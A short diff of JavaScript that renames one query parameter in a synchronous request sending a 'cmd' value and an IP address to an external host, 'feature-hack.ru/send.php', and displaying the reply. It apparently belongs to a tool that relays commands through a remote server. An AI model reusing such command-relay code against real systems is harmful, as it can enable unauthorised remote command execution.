@@ -54,7 +54,7 @@ window.addEventListener('DOMContentLoaded', function (evt) {
         var text = document.getElementById('response');
 
 
-        x.open("GET", "http://feature-hack.ru/send.php?cmd=" + cmd + "&pk=test&ip=" + ip, false);
+        x.open("GET", "http://feature-hack.ru/send.php?cmd=" + cmd + "&pk1=test&ip=" + ip, false);
         x.onload = function (){
             text.textContent=x.responseText;
             //
